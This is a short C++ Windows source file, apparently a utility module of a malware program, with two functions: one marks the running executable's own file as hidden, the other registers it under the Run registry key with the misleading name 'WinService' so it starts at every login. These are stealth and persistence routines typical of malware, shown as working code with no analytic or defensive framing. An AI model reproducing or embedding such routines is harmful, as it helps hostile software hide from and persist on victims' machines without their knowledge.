#include "pch.h"
#include "Utils.h"

void Utils::hideExecutionFile()
{
	char bData[MAX_PATH];
	GetModuleFileNameA(NULL, bData, MAX_PATH);
	LPCSTR lpName = bData;
	int attr = GetFileAttributesA(lpName);

	if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0)
		SetFileAttributesA(lpName, attr | FILE_ATTRIBUTE_HIDDEN);
}

void Utils::writeInReg()
{
	HKEY hKey;
	LPCSTR lpSubKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\";

	DWORD Disposition = -1;

	LSTATUS lKeyStatus = RegCreateKeyExA(HKEY_CURRENT_USER, lpSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &Disposition);

	if (lKeyStatus != ERROR_SUCCESS)
		return;

	char bData[MAX_PATH];
	GetModuleFileNameA(NULL, bData, MAX_PATH);

	LSTATUS lValStatus = RegSetValueExA(hKey, "WinService", 0, REG_SZ, (const BYTE*)bData, sizeof(bData));

	if (lValStatus != ERROR_SUCCESS)
		return;

	RegCloseKey(hKey);
}
